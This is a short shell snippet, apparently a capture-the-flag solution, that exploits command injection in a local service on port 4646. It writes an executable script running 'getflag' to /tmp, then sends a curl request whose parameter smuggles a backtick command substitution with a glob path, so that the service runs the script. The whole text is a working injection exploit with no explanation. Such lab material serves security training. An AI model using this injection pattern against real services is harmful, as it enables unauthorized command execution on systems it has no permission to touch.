echo 'getflag > /tmp/flag' > /tmp/COUCOU
chmod 755 /tmp/COUCOU
curl localhost:4646?x=\`/*/COUCOU\`